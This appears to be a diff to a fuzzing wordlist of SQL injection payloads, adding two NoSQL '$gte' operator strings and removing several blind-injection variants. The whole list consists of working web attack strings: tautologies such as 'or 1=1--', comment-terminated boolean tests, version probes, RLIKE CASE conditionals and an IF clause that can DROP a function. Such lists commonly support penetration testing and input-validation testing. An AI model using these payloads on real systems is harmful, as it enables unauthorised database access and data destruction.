@@ -23,6 +23,8 @@ AND 1=1#
 *
 &
 #
+{"$gte":0}
+{"$gte":1}
 1') and '1'='1--
 1 or 1=1
 AND 1=0
@@ -37,12 +39,6 @@ AND 7506=9091 AND (5913=5913
 ' and 'one'='one
 ' and 'one'='one--
  and (select substring(@@version,1,1))='X'
-AS INJECTX WHERE 1=1 AND 1=0
-AS INJECTX WHERE 1=1 AND 1=0--
-AS INJECTX WHERE 1=1 AND 1=0#
-AS INJECTX WHERE 1=1 AND 1=1
-AS INJECTX WHERE 1=1 AND 1=1--
-AS INJECTX WHERE 1=1 AND 1=1#
 CAST('eviware' AS SIGNED INTEGER)
 devnull' or '1
 false
@@ -56,7 +52,6 @@ hi' or 1=1 --
 hi" or 1=1 --
 hi" or "a"="a
 IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
-IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
 ' or ''^'
 ' or ''='
 ' or '' '
@@ -102,7 +97,6 @@ OR 1=1--
 OR 1=1#
 ' or 1=1 or "='
 OR 3409=3409 AND ('pytW' LIKE 'pytW
-OR 3409=3409 AND ('pytW' LIKE 'pytY
 ' or a=a--
 ') or ('a'='a
 " or "a"="a
@@ -139,8 +133,6 @@ OR x=x#
 OR x=y
 OR x=y-- 
 OR x=y#
-RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
-RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=0#
